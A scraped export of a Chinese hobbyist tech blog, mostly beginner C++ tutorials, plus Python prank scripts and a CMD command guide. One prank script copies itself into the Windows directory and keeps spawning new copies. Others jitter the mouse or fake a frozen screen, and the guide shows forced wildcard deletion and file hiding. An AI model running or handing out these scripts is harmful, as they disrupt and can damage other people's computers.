&lt;bits/stdc++.h&gt; using namespace std; int main(){ int index=1; do{ cout&lt;&lt;index++&lt;&lt;&quot; &quot;; } while(index&lt;=100); return 0; } for循环 for循环是重中之重。 你看一个比较高级的算法里，很少有不带for的： 咳咳咳扯远了，我们还是先看看怎么用吧。 for(int 循环内变量=初始值;循环逻辑表达式;变量的变化){ 要执行的指令 } 有没有觉得很复杂？其实你看，很简单的： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ for(int i=1;i&lt;=100;i++){ cout&lt;&lt;i&lt;&lt;&quot; &quot;; } return 0; } 我最开始也不喜欢用for，但是慢慢就发现还是for最省力气。 来练练手： 请使用for循环输出N个正整数（小于100）的最大值。 输入： 5 1 2 5 4 3 输出： 5 这时候，我们使用一种不一样的办法。这种办法本质上我觉得像是一种递推算法，推出来最大的数。 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ int n,tmp,maxn=0; cin&gt;&gt;n; for(int i=0;i&lt;n;i++){ // 输入这个数 cin&gt;&gt;tmp; if(tmp&gt;maxn){ // 如果比当前最大的还大，就让它成为最大的 maxn=tmp; } } cout&lt;&lt;maxn; return 0; } 呀哈没考住你，再来一道！ 请使用for循环输出N个正整数（小于100）的最大值、最小值、平均值。 输入： 5 2 3 1 4 5 输出： 5 1 3 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ int n,minn=0xcffff,maxn=0,avgn=0; int tmp; // 临时变量 cin&gt;&gt;n; // 循环，输入 for(int i=0;i&lt;n;i++){ cin&gt;&gt;tmp; // 更新最大值 maxn=max(maxn,tmp); // 更新最小值 minn=min(minn,tmp); // 计算和 avgn+=tmp; } // 输出 cout&lt;&lt;maxn&lt;&lt;&quot; &quot;&lt;&lt;minn&lt;&lt;&quot; &quot;&lt;&lt;avgn/n; return 0; } 好啦，今天就先到这里吧，明天再见咯~ ","tags":[{"index":2,"name":"OI 从入门到出门","slug":"oier-yyds","used":true,"link":"https://daoxi365.github.io/tech-blog/oier-yyds/"},{"index":-1,"name":"OI 系列","slug":"oi","used":true,"link":"https://daoxi365.github.io/tech-blog/oi/"}],"title":"二、判断 & 循环","feature":"https://daoxi365.github.io/tech-blog//post-images/pan-duan-and-xun-huan.png","link":"https://daoxi365.github.io/tech-blog/pan-duan-and-xun-huan/","stats":{"text":"13 min read","time":742000,"words":2812,"minutes":13},"date":"2022-07-30 14:54:00","dateFormat":"2022-07-30"},{"content":"hello，大家好，我是你们的新朋友，你们可以叫我小潘~ 或许大家是第一次见到我，也有可能是其他平台过来的，我都要给大家作个自我介绍：我是来自河北石家庄的一名新初一学生。我热爱编程技术，擅长Python、C++和命令行（Windows批处理），目标是信息学竞赛。 我的同学们都说我很幽默，甚至有人说我“不正经”😑 。 你现在看到的文章是一个特别、特别厉害的失败者写下的，希望大家可以吸取我的惨痛教训，创造出你们的海阔天空。 咳咳，别的好成绩别说，我直到现在的模拟赛成绩都在100以内。 OK，我们介绍完了，来说说这个专辑C++信息学竞赛从入门到出门😎 ，大家可以在这里从学C++，入门信息学竞赛，然后再出门！ 那我们废话不多说，现在我们来开始今天的内容———— HELLO,C++ 首先吧，你得知道C++是啥，不然学了半天都白学。 C++ 是一种静态类型的、编译式的、通用的、大小写敏感的、不规则的编程语言，支持过程化编程、面向对象编程和泛型编程。 C++ 被认为是一种中级语言，它综合了高级语言和低级语言的特点。 C++ 是由 Bjarne Stroustrup 于 1979 年在新泽西州美利山贝尔实验室开始设计开发的。C++ 进一步扩充和完善了 C 语言，最初命名为带类的C，后来在 1983 年更名为 C++。 C++ 是 C 的一个超集，事实上，任何合法的 C 程序都是合法的 C++ 程序。 注意：使用静态类型的编程语言是在编译时执行类型检查，而不是在运行时执行类型检查。 C++ 完全支持面向对象的程序设计，包括面向对象开发的四大特性：封装、抽象、继承、多态 我嘞个去，这都是啥跟啥啊？！ 没关系，看不懂也没事儿，就记住一点：C++是面向对象编程语言！ C++、Python、Java等等等，现在主流的编程语言，除了C语言，都是面向对象编程语言。 OK，看到这儿，你就能做题了： [CSP-J 2021]以下不属于面向对象程序设计语言的是（ ）。 A. C++ B. Python C. Java D. C 显而易见~答案是？D！ 现在，你的C++漫漫长路，已经迈出了第一步。我们继续看： Luogu B2002 Hello,World! 【题目背景】 强烈推荐新用户必读贴 【题目描述】 编写一个能够输出 Hello,World! 的程序，这个程序常常作为一个初学者接触一门新的编程语言所写的第一个程序，也经常用来测试开发、编译环境是否能够正常工作。 【样例 #1】 【样例输入 #1】 无 【样例输出 #1】 Hello,World! 【提示】 使用英文标点符号； Hello,World! 逗号后面没有空格。 大家都有devcpp吧？如果没有就下一个安装，有的话就继续搞~ 现在，让我们开始熟悉语法。 在我们学函数和递归算法以前，你完全可以把下面的内容当做模板： #include &lt;bits/stdc++.h&gt; // 导入所有函数，万能头文件 using namespace std; // 使用命名空间 int main(){ // 在这里写程序 return 0; // 退出程序 } 我们这时候要输出Hello,world!，需要先认识两个重要功能：cout和printf。它们是标准的输出流。用法： cout&lt;&lt;&quot;这里是cout输出的内容&quot;&lt;&lt;endl; // endl为换行 printf(&quot;这里是printf输出的内容\\n&quot;); // \\n为换行 在devcpp里面写好，编译运行： 你可以看到，程序正常地输出了文字。 那么还有个问题，怎么输入呢？ // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ // 在此声明变量 cin&gt;&gt;变量1&gt;&gt;变量2&gt;&gt;...&gt;&gt;变量n; return 0; } 这样，就给每个变量输入并赋值啦~ C++的运算 运算是很简单的啊，和别的语言一样。相信大家对别的编程语言有所了解，其实都一样，一通百通~ 就是这么神奇~来试试看： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ // 建议加上括号，不加也对 cout&lt;&lt;(1+2)&lt;&lt;endl; cout&lt;&lt;(1-2)&lt;&lt;endl; cout&lt;&lt;(1*2)&lt;&lt;endl; cout&lt;&lt;(1%2)&lt;&lt;endl; // 取余运算 // 数据范围小的话可以使用pow函数计算幂，该句的意思是1的平方。 cout&lt;&lt;pow(1,2)&lt;&lt;endl; // 计算2的算术平方根 cout&lt;&lt;sqrt(2)&lt;&lt;endl; return 0; } 但是，有一个易错点，你知道下面这个程序输出的结果嘛？ // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ cout&lt;&lt;(1/2); return 0; } 哈哈哈，惊讶吗？？这是为什么？！ 因为C++语言是个静态类型语言，它不转换的话整数始终是整数，小数始终是小数。所以在C++的眼里1/2=0.5，但是1和2是整数，所以要向下取整，结果就是0！这一点一定要记住，特别重要！！ 但是怎么才能让它变成小数类型呢？首先我们要认识一个概念： float 为 “单精度浮点数”； double 为 “双精度浮点数”。 在信息学竞赛中，我们使用double类型比较多，那么如何强制类型转换呢？ (要转换的数据类型)(要转换的内容) 例如，我们需要转换1/2的值，可以这样写： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ cout&lt;&lt;(double)(1)/(double)(2); return 0; } 这里有个小坑儿，需要先转换然后再做除法。因为转换前会先运算表达式，所以整型的结果转换为浮点型，和原来一样。 这里还有个点儿，比较低级的类型转换类型时会自动转换。所以想要实现刚才的效果还可以这样写： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ cout&lt;&lt;(double)(1)/2&lt;&lt;endl; cout&lt;&lt;1/(double)(2)&lt;&lt;endl; return 0; } C++语言有好多坑，一不留神就踩进去了！ 现在我们来看一个题儿： Luogu B2022 输出保留 12 位小数的浮点数 啊这，怎么保留呢？ 记住一个写法： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ cout&lt;&lt;fixed&lt;&lt;setprecision(保留小数的位数)&lt;&lt;保留的小数; return 0; } 结合以前的写法，你自己写一写叭！ 参考答案： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ double n; cin&gt;&gt;n; cout&lt;&lt;fixed&lt;&lt;setprecision(12)&lt;&lt;n; return 0; } 今天，就先说到这儿叭，明天见！ ","tags":[{"index":2,"name":"OI 从入门到出门","slug":"oier-yyds","used":true,"link":"https://daoxi365.github.io/tech-blog/oier-yyds/"},{"index":-1,"name":"OI 系列","slug":"oi","used":true,"link":"https://daoxi365.github.io/tech-blog/oi/"}],"title":"一、HELLO, C++","feature":"https://daoxi365.github.io/tech-blog//post-images/hello-cpp.png","link":"https://daoxi365.github.io/tech-blog/hello-cpp/","stats":{"text":"7 min read","time":404000,"words":1728,"minutes":7},"date":"2022-07-29 21:45:00","dateFormat":"2022-07-29"},{"content":"from random import randint from pyautogui import position,moveTo,size,FAILSAFE FAILSAFE = False sX,sY = size() while True: try: x,y = position() if x &lt;= sX and y &lt;= sY: newX = eval('%d %s %d' % (x,['+','-'][randint(0,1)],randint(1,12))) newY = eval('%d %s %d' % (y,['+','-'][randint(0,1)],randint(1,12))) moveTo(newX,newY) else: moveTo(0,0) except: pass 需要安装 pyautogui 依赖包。 运行后，鼠标开始无规律的抖动，点关闭程序的按钮都有点困难。主要就是随机数的知识。 这里用到了一个eval语句，帮助我们合成算式，再将鼠标移动到结果的位置。 您也可以自己设定抖动幅度。 ","tags":[{"index":-1,"name":"整活","slug":"TFA","used":true,"link":"https://daoxi365.github.io/tech-blog/TFA/"}],"title":"Python 鼠标抖动","feature":"","link":"https://daoxi365.github.io/tech-blog/python-shu-biao-dou-dong/","stats":{"text":"1 min read","time":41000,"words":149,"minutes":1},"date":"2022-02-26 12:38:50","dateFormat":"2022-02-26"},{"content":" 我的仓库，需要的文件可以下载。 点这儿。 屏幕重影 屏幕移动 随机音乐（因服务更新，已失效） 等比弹窗 屏幕反色 屏幕闪烁 屏幕失效 屏幕重影 import pygame from pygame.locals import * from pyautogui import screenshot pygame.init() canvas = pygame.display.set_mode((800,800)) pygame.display.set_caption('Sshot') canvas.fill((255,255,255)) screenshot(region = (0,0,800,800)).save('sshot.png') i = pygame.image.load('sshot.png') canvas.blit(i,(0,0)) def h(): for event in pygame.event.get(): if event.type==KEYDOWN and event.key==K_ESCAPE: pygame.quit() exit() while True: canvas.blit(i,(0,0)) screenshot(region = (0,0,800,800)).save('sshot.png') i = pygame.image.load('sshot.png') h() pygame.display.update() 屏幕移动 import pygame from pygame.locals import * from pyautogui import screenshot from random import randint def f(): global bg screenshot(region = (0,0,1920,1080)).save('sshot.png') bg = pygame.image.load('sshot.png') f() pygame.init() canvas = pygame.display.set_mode((1920,1080)) canvas.fill((255,255,255)) pygame.display.set_caption('MOVE') def h(): for event in pygame.event.get(): if event.type == KEYDOWN and event.key == K_ESCAPE: pygame.quit() exit() x1 = 0 y1 = 0 height = 1080 x2 = 0 y2 = -height x3 = 0 y3 = 0 width = 1920 x4 = 0 y4 = 0 n = randint(0,1) while True: if n: canvas.blit(bg,(x1,y1)) y1 += 3 canvas.blit(bg,(x2,y2)) y2 += 3 if y1 &gt; height: y1 = -height if y2 &gt; height: y2 = -height else: canvas.blit(bg,(x3,y3)) x3 += 3 canvas.blit(bg,(x4,y4)) x4 += 3 if x3 &gt; width: x3 = -width if x4 &gt; width: x4 = -width h() pygame.display.update() 随机音乐（因服务更新，已失效） from random import choice from requests import get from os import system # range(ord('a'),ord('t') + 1) fl = [] for i in range(97,117): fl.append('https://pandaoxi.coding.net/p/pandaoxi/d/PanDaoxi/git/raw/master/%E9%9F%B3%E4%B9%90%E8%B5%84%E6%BA%90/{}.mp3?download=true'.format(chr(i))) f = choice(fl) print(f) with open('music.mp3','wb') as w: w.write(get(f).content) system('call music.mp3') 等比弹窗 以前做过，不演示了 from tkinter import Tk,Label from random import randint from os import system,name,environ from time import sleep title = &quot;Message&quot; message = &quot;很不好意思，您的电脑废了&quot; loops = [] window = Tk() window.geometry(&quot;350x50&quot;) window.title(title) path=environ[&quot;windir&quot;] def main(): global loops,window Label(window,text=message,font=('Microsoft YaHei',20)).pack() sleep(5) with open(__file__,&quot;r&quot;,encoding=&quot;utf-8&quot;) as f: text = f.read() for i in range(0,2): content = &quot;%s\\\\%d.py&quot; % (path,randint(100000,999999)) with open(content,&quot;w&quot;,encoding=&quot;utf-8&quot;) as f: f.write(text) loops.append(content) for i in range(0,2): system(&quot;start /min cmd /c python %s&quot; % loops[i]) if __name__ == &quot;__main__&quot; and name == &quot;nt&quot;: main() else: showerror(&quot;Message&quot;,&quot;无法运行程序，原因可能是：\\n①(1)您非主动运行程序。\\n(2)这个程序不能在当前系统下运行，请尝试其他操作系统。&quot;) exit() window.mainloop() 屏幕反色 import cv2 import pygame from pygame.locals import * from pyautogui import screenshot from random import randint from time import sleep screenshot(region = (0,0,1920,1080)).save('sshot.png') im = pygame.image.load('sshot.png') pygame.init() canvas = pygame.display.set_mode((1920,1080)) pygame.display.set_caption('SCREEN') for i in range(0,100): canvas.blit(im,(0,0)) def f(): screenshot(region = (0,0,1920,1080)).save('sshots.png') img = cv2.imread('sshots.png', 1) img_shape = img.shape h = img_shape[0] w = img_shape[1] dst = 255 - img x = randint(100000,999999) cv2.imwrite(&quot;save%d.png&quot; % x,dst,[cv2.IMWRITE_PNG_COMPRESSION,0]) i = pygame.image.load(&quot;save%d.png&quot; % x) canvas.blit(i,(0,0)) cv2.waitKey(0) def h(): for event in pygame.event.get(): if event.type == KEYDOWN and event.key == K_ESCAPE: pygame.quit() exit() while True: f() h() pygame.display.update() pygame.time.delay(randint(500,3500)) 屏幕闪烁 这个我也做过，不说了 import pygame from pygame.locals import * from random import randint pygame.init() canvas = pygame.display.set_mode((1920,1080)) pygame.display.set_caption(&quot;Computer Dance&quot;) canvas.fill((255,255,255)) def h(): for event in pygame.event.get(): if event.type==KEYDOWN and event.key==K_ESCAPE: pygame.quit() exit() while True: r,g,b = randint(0,255),randint(0,255),randint(0,255) rgb = (r,g,b) canvas.fill(rgb) h() pygame.display.update() 屏幕失效 import pygame from pygame.locals import * from pyautogui import screenshot screenshot(region = (0,0,1920,1080)).save('sshot.png') i = pygame.image.load(&quot;./sshot.png&quot;) pygame.init() canvas = pygame.display.set_mode((1920,1080)) pygame.display.set_caption('Sshot') canvas.blit(i,(0,0)) def h(): for event in pygame.event.get(): if event.type==KEYDOWN and event.key==K_ESCAPE: pygame.quit() exit() while True: canvas.blit(i,(0,0)) screenshot(region = (0,0,1920,1080)).save('sshot.png') i = pygame.image.load('sshot.png') h() pygame.display.update() ","tags":[{"index":-1,"name":"整活","slug":"TFA","used":true,"link":"https://daoxi365.github.io/tech-blog/TFA/"}],"title":"Python 程序特效","feature":"https://daoxi365.github.io/tech-blog//post-images/python-cheng-xu-te-xiao.png","link":"https://daoxi365.github.io/tech-blog/python-cheng-xu-te-xiao/","stats":{"text":"6 min read","time":328000,"words":949,"minutes":6},"date":"2022-02-22 13:14:19","dateFormat":"2022-02-22"},{"content":" 前言 正文 一、测试网络用的ping命令 二、显示或隐藏文件的attrib命令 三、删除文件无影无踪的del命令 四、神奇的目录树tree命令 五、说没就没的命令taskkill 六、可爱的循环for命令 七、打开程序的start命令 八、CMD下切换目录cd命令 九、创建文件夹的命令md 十、操作注册表reg命令 前言 什么是CMD？它有什么用？？如何使用？？？ Windows 命令提示符（cmd.exe）是 Windows NT 下的一个用于运行 Windows 控制面板程序或某些 DOS 程序的shell程序；或在 Windows CE 下只用于运行控制面板程序的外壳程序。 ——360百科 网上一打开，都是这种无聊的玩意儿： 在这些文章中，CMD失去了它本来的意义。 今天我来给大家分享10个有趣的CMD命令，在关键时刻都有重大的作用。 OK，开始吧。 正文 首先打开你的CMD： Ctrl+Shift+Esc，呼出任务管理器。 点击文件，点击运行新任务。 输入cmd.exe，以管理员身份运行（可选，本文中不用使用管理员身份了）。 一、测试网络用的ping命令 用法: ping [-t] [-a] [-n count] [-l size] [-f] [-i TTL] [-v TOS] [-r count] [-s count] [[-j host-list] | [-k host-list]] [-w timeout] [-R] [-S srcaddr] [-c compartment] [-p] [-4] [-6] target_name 选项: -t Ping 指定的主机，直到停止。 若要查看统计信息并继续操作，请键入 Ctrl+Break； 若要停止，请键入 Ctrl+C。 -a 将地址解析为主机名。 -n count 要发送的回显请求数。 -l size 发送缓冲区大小。 -f 在数据包中设置“不分段”标记(仅适用于 IPv4)。 -i TTL 生存时间。 -v TOS 服务类型(仅适用于 IPv4。该设置已被弃用， 对 IP 标头中的服务类型字段没有任何 影响)。 -r count 记录计数跃点的路由(仅适用于 IPv4)。 -s count 计数跃点的时间戳(仅适用于 IPv4)。 -j host-list 与主机列表一起使用的松散源路由(仅适用于 IPv4)。 -k host-list 与主机列表一起使用的严格源路由(仅适用于 IPv4)。 -w timeout 等待每次回复的超时时间(毫秒)。 -R 同样使用路由标头测试反向路由(仅适用于 IPv6)。 根据 RFC 5095，已弃用此路由标头。 如果使用此标头，某些系统可能丢弃 回显请求。 -S srcaddr 要使用的源地址。 -c compartment 路由隔离舱标识符。 -p Ping Hyper-V 网络虚拟化提供程序地址。 -4 强制使用 IPv4。 -6 强制使用 IPv6。 我们可以使用它来测试网络是否可用，输入命令ping 网址。 也可以用于延时，但是不是那么精准。 C:\\Users\\86139&gt;ping baidu.com /n 5 正在 Ping baidu.com [220.181.38.251] 具有 32 字节的数据: 来自 220.181.38.251 的回复: 字节=32 时间=11ms TTL=49 来自 220.181.38.251 的回复: 字节=32 时间=11ms TTL=49 来自 220.181.38.251 的回复: 字节=32 时间=11ms TTL=49 来自 220.181.38.251 的回复: 字节=32 时间=11ms TTL=49 来自 220.181.38.251 的回复: 字节=32 时间=11ms TTL=49 220.181.38.251 的 Ping 统计信息: 数据包: 已发送 = 5，已接收 = 5，丢失 = 0 (0% 丢失)， 往返行程的估计时间(以毫秒为单位): 最短 = 11ms，最长 = 11ms，平均 = 11ms 二、显示或隐藏文件的attrib命令 这个东西我们不多说，只说两种用法。 好比我这里有个文件test.txt，里面有一些内容。我们如何隐藏它？ 其实，我在cmd里面，输入了一行命令：attrib +s +h /s /d test.txt。+s的意思就是添加系统属性，+h添加隐藏属性。 但是这个文件并不是没有了，只需要再输入一行命令：attrib -s -h /s /d test.txt即可恢复。 三、删除文件无影无踪的del命令 这个我记得我以前讲过。这里有好多文件： 如何删除掉里面的exe文件呢？需要使用删除命令del /q /s /f *.exe。*是通配符，这句命令的意思就是删除所有匹配后缀为.exe的文件。同理，当我们想删除所有文件时，即可使用通配符*.*。 这个命令是这样使用的。 删除一个或多个文件。 DEL [/P] [/F] [/S] [/Q] [/A[[:]attributes]] names ERASE [/P] [/F] [/S] [/Q] [/A[[:]attributes]] names names 指定一个或多个文件或者目录列表。 通配符可用来删除多个文件。 如果指定了一个目录，该目录中的所 有文件都会被删除。 /P 删除每一个文件之前提示确认。 /F 强制删除只读文件。 /S 删除所有子目录中的指定的文件。 /Q 安静模式。删除全局通配符时，不要求确认 /A 根据属性选择要删除的文件 属性 R 只读文件 S 系统文件 H 隐藏文件 A 准备存档的文件 I 无内容索引文件 L 重新分析点 O 脱机文件 - 表示“否”的前缀 如果命令扩展被启用，DEL 和 ERASE 更改如下: /S 开关的显示句法会颠倒，即只显示已经 删除的文件，而不显示找不到的文件。 瞬间，.exe的文件都没了。 这个命令不要随便使用，因为它不会把删除的文件放入回收站，而是直接删除。 当你有足够的权限，您甚至可以干掉%windir%目录下的文件，但是您的电脑系统就废了。 老潘电脑课堂开课啦，随便瞎删电脑里的东西，多半是废了！ 另外，这里还有一个奇妙的玩法，那就是del %0批处理自删除，效果如下： 四、神奇的目录树tree命令 这个东西不难，而且很实用，我以前的文章中展现目录树，就用的它。 以图形显示驱动器或路径的文件夹结构。 TREE [drive:][path] [/F] [/A] /F 显示每个文件夹中文件的名称。 /A 使用 ASCII 字符，而不使用扩展字符。 我展开一个我的文件夹，各位请上演！ D:\\编程代码\\共享文件夹&gt;tree /f 卷 Data 的文件夹 PATH 列表 卷序列号为 90AF-CB35 D:. │ a8ab838aade1be7763e20d8a6e4cc85e9bda8b5ef2e29d4f9f2be38fefb37065.zip │ lframeCNDocs.zip │ NSudo_9.0_Preview1_9.0.2676.0.zip │ ├─battoexe │ Bat_To_Exe_Converter.exe │ settings │ └─System Volume Information 嗯，这样展示很清楚的。 五、说没就没的命令taskkill 我没说清，这个命令是让进程说没就没。 TASKKILL [/S system [/U username [/P [password]]]] { [/FI filter] [/PID processid | /IM imagename] } [/T] [/F] 描述: 使用该工具按照进程 ID (PID) 或映像名称终止任务。 参数列表: /S system 指定要连接的远程系统。 /U [domain\\]user 指定应该在哪个用户上下文执行这个命令。 /P [password] 为提供的用户上下文指定密码。如果忽略，提示 输入。 /FI filter 应用筛选器以选择一组任务。 允许使用 &quot;*&quot;。例如，映像名称 eq acme* /PID processid 指定要终止的进程的 PID。 使用 TaskList 取得 PID。 /IM imagename 指定要终止的进程的映像名称。通配符 '*'可用来 指定所有任务或映像名称。 /T 终止指定的进程和由它启用的子进程。 /F 指定强制终止进程。 /? 显示帮助消息。 筛选器: 筛选器名 有效运算符 有效值 ----------- --------------- ------------------------- STATUS eq, ne RUNNING | NOT RESPONDING | UNKNOWN IMAGENAME eq, ne 映像名称 PID eq, ne, gt, lt, ge, le PID 值 SESSION eq, ne, gt, lt, ge, le 会话编号。 CPUTIME eq, ne, gt, lt, ge, le CPU 时间，格式为 hh:mm:ss。 hh - 时， mm - 分，ss - 秒 MEMUSAGE eq, ne, gt, lt, ge, le 内存使用量，单位为 KB USERNAME eq, ne 用户名，格式为 [domain\\]user MODULES eq, ne DLL 名称 SERVICES eq, ne 服务名称 WINDOWTITLE eq, ne 窗口标题 说明 ---- 1) 只有在应用筛选器的情况下，/IM 切换才能使用通配符 '*'。 2) 远程进程总是要强行 (/F) 终止。 3) 当指定远程机器时，不支持 &quot;WINDOWTITLE&quot; 和 &quot;STATUS&quot; 筛选器。 例如: TASKKILL /IM notepad.exe TASKKILL /PID 1230 /PID 1241 /PID 1253 /T TASKKILL /F /IM cmd.exe /T TASKKILL /F /FI &quot;PID ge 1000&quot; /FI &quot;WINDOWTITLE ne untitle*&quot; TASKKILL /F /FI &quot;USERNAME eq NT AUTHORITY\\SYSTEM&quot; /IM notepad.exe TASKKILL /S system /U 域\\用户名 /FI &quot;用户名 ne NT*&quot; /IM * TASKKILL /S system /U username /P password /FI &quot;IMAGENAME eq note*&quot; 我们来试试。我现在写了一个弹窗。如何关闭？直接点叉就行。 当我们加了个死循环，效果就变了。点叉，关不完的。 这时候，我们可以使用命令taskkill /im python.exe /f，就关掉了。 成功: 已终止进程 &quot;python.exe&quot;，其 PID 为 3440。 六、可爱的循环for命令 这个大家都熟，谁都知道。 对一组文件中的每一个文件执行某个特定命令。 FOR %variable IN (set) DO command [command-parameters] %variable 指定一个单一字母可替换的参数。 (set) 指定一个或一组文件。可以使用通配符。 command 指定对每个文件执行的命令。 command-parameters 为特定命令指定参数或命令行开关。 在批处理程序中使用 FOR 命令时，指定变量请使用 %%variable 而不要用 %variable。变量名称是区分大小写的，所以 %i 不同于 %I. 如果启用命令扩展，则会支持下列 FOR 命令的其他格式: FOR /D %variable IN (set) DO command [command-parameters] 如果集中包含通配符，则指定与目录名匹配，而不与文件名匹配。 FOR /R [[drive:]path] %variable IN (set) DO command [command-parameters] 检查以 [drive:]path 为根的目录树，指向每个目录中的 FOR 语句。 如果在 /R 后没有指定目录规范，则使用当前目录。如果集仅为一个单点(.)字符， 则枚举该目录树。 FOR /L %variable IN (start,step,end) DO command [command-parameters] 该集表示以增量形式从开始到结束的一个数字序列。因此，(1,1,5)将产生序列 1 2 3 4 5，(5,-1,1)将产生序列(5 4 3 2 1) FOR /F [&quot;options&quot;] %variable IN (file-set) DO command [command-parameters] FOR /F [&quot;options&quot;] %variable IN (&quot;string&quot;) DO command [command-parameters] FOR /F [&quot;options&quot;] %variable IN ('command') DO command [command-parameters] 或者，如果有 usebackq 选项: FOR /F [&quot;options&quot;] %variable IN (file-set) DO command [command-parameters] FOR /F [&quot;options&quot;] %variable IN (&quot;string&quot;) DO command [command-parameters] FOR /F [&quot;options&quot;] %variable IN ('command') DO command [command-parameters] fileset 为一个或多个文件名。继续到 fileset 中的下一个文件之前， 每份文件都被打开、读取并经过处理。处理包括读取文件，将其分成一行行的文字， 然后将每行解析成零或更多的符号。然后用已找到的符号字符串变量值调用 For 循环。 以默认方式，/F 通过每个文件的每一行中分开的第一个空白符号。跳过空白行。 你可通过指定可选 &quot;options&quot; 参数替代默认解析操作。这个带引号的字符串包括一个 或多个指定不同解析选项的关键字。这些关键字为: eol=c - 指一个行注释字符的结尾(就一个) skip=n - 指在文件开始时忽略的行数。 delims=xxx - 指分隔符集。这个替换了空格和制表符的 默认分隔符集。 tokens=x,y,m-n - 指每行的哪一个符号被传递到每个迭代 的 for 本身。这会导致额外变量名称的分配。m-n 格式为一个范围。通过 nth 符号指定 mth。如果 符号字符串中的最后一个字符星号， 那么额外的变量将在最后一个符号解析之后 分配并接受行的保留文本。 usebackq - 指定新语法已在下类情况中使用: 在作为命令执行一个后引号的字符串并且一个单 引号字符为文字字符串命令并允许在 file-set 中使用双引号扩起文件名称。 某些范例可能有助: FOR /F &quot;eol=; tokens=2,3* delims=, &quot; %i in (myfile.txt) do @echo %i %j %k 会分析 myfile.txt 中的每一行，忽略以分号打头的那些行，将 每行中的第二个和第三个符号传递给 for 函数体，用逗号和/或 空格分隔符号。请注意，此 for 函数体的语句引用 %i 来 获得第二个符号，引用 %j 来获得第三个符号，引用 %k 来获得第三个符号后的所有剩余符号。对于带有空格的文件 名，你需要用双引号将文件名括起来。为了用这种方式来使 用双引号，还需要使用 usebackq 选项，否则，双引号会 被理解成是用作定义某个要分析的字符串的。 %i 在 for 语句中显式声明，%j 和 %k 是通过 tokens= 选项隐式声明的。可以通过 tokens= 一行 指定最多 26 个符号，只要不试图声明一个高于字母 &quot;z&quot; 或 &quot;Z&quot; 的变量。请记住，FOR 变量是单一字母、分大小写和全局的变量； 而且，不能同时使用超过 52 个。 还可以在相邻字符串上使用 FOR /F 分析逻辑，方法是， 用单引号将括号之间的 file-set 括起来。这样，该字符 串会被当作一个文件中的一个单一输入行进行解析。 最后，可以用 FOR /F 命令来分析命令的输出。方法是，将 括号之间的 file-set 变成一个反括字符串。该字符串会 被当作命令行，传递到一个子 CMD.EXE，其输出会被捕获到 内存中，并被当作文件分析。如以下例子所示: FOR /F &quot;usebackq delims==&quot; %i IN (`set`) DO @echo %i 会枚举当前环境中的环境变量名称。 另外，FOR 变量参照的替换已被增强。你现在可以使用下列 选项语法: %~I - 删除任何引号(&quot;)，扩展 %I %~fI - 将 %I 扩展到一个完全合格的路径名 %~dI - 仅将 %I 扩展到一个驱动器号 %~pI - 仅将 %I 扩展到一个路径 %~nI - 仅将 %I 扩展到一个文件名 %~xI - 仅将 %I 扩展到一个文件扩展名 %~sI - 扩展的路径只含有短名 %~aI - 将 %I 扩展到文件的文件属性 %~tI - 将 %I 扩展到文件的日期/时间 %~zI - 将 %I 扩展到文件的大小 %~$PATH:I - 查找列在路径环境变量的目录，并将 %I 扩展 到找到的第一个完全合格的名称。如果环境变量名 未被定义，或者没有找到文件，此组合键会扩展到 空字符串 可以组合修饰符来得到多重结果: %~dpI - 仅将 %I 扩展到一个驱动器号和路径 %~nxI - 仅将 %I 扩展到一个文件名和扩展名 %~fsI - 仅将 %I 扩展到一个带有短名的完整路径名 %~dp$PATH:I - 搜索列在路径环境变量的目录，并将 %I 扩展 到找到的第一个驱动器号和路径。 %~ftzaI - 将 %I 扩展到类似输出线路的 DIR 在以上例子中，%I 和 PATH 可用其他有效数值代替。%~ 语法 用一个有效的 FOR 变量名终止。选取类似 %I 的大写变量名 比较易读，而且避免与不分大小写的组合键混淆。 好长！我们只说类似于range()的循环。 格式（管理员模式下，请将%i替换为%%i）for /l %i in (开始的地方,步长step,结束的地方) do 命令，结束的时候会停止到前一项，如(1,1,10)的循环为1~9。 现在我们来创建一批C++文件，10个。 for /l %i in (1,1,10) do echo // Author:PanDaoxi&gt;&gt;%i.cpp 七、打开程序的start命令 打开程序的操作想必大家都很明白咯。 启动一个单独的窗口以运行指定的程序或命令。 START [&quot;title&quot;] [/D path] [/I] [/MIN] [/MAX] [/SEPARATE | /SHARED] [/LOW | /NORMAL | /HIGH | /REALTIME | /ABOVENORMAL | /BELOWNORMAL] [/NODE &lt;NUMA node&gt;] [/AFFINITY &lt;hex affinity mask&gt;] [/WAIT] [/B] [command/program] [parameters] &quot;title&quot; 在窗口标题栏中显示的标题。 path 启动目录。 B 启动应用程序，但不创建新窗口。 应用程序已忽略 ^C 处理。除非应用程序 启用 ^C 处理，否则 ^Break 是唯一可以中断 该应用程序的方式。 I 新的环境将是传递 给 cmd.exe 的原始环境，而不是当前环境。 MIN 以最小化方式启动窗口。 MAX 以最大化方式启动窗口。 SEPARATE 在单独的内存空间中启动 16 位 Windows 程序。 SHARED 在共享内存空间中启动 16 位 Windows 程序。 LOW 在 IDLE 优先级类中启动应用程序。 NORMAL 在 NORMAL 优先级类中启动应用程序。 HIGH 在 HIGH 优先级类中启动应用程序。 REALTIME 在 REALTIME 优先级类中启动应用程序。 ABOVENORMAL 在 ABOVENORMAL 优先级类中启动应用程序。 BELOWNORMAL 在 BELOWNORMAL 优先级类中启动应用程序。 NODE 将首选非一致性内存结构(NUMA)节点指定为 十进制整数。 AFFINITY 将处理器关联掩码指定为十六进制数字。 进程被限制在这些处理器上运行。 将 /AFFINITY 和 /NODE 结合使用时，会对关联掩码 进行不同的解释。指定关联掩码，以便将零位作为起始位置(就如将 NUMA 节点的处理器掩码向右移位一样)。 进程被限制在指定关联掩码和 NUMA 节点之间的 那些通用处理器上运行。 如果没有通用处理器，则进程被限制在 指定的 NUMA 节点上运行。 WAIT 启动应用程序并等待它终止。 command/program 如果它是内部 cmd 命令或批文件，则 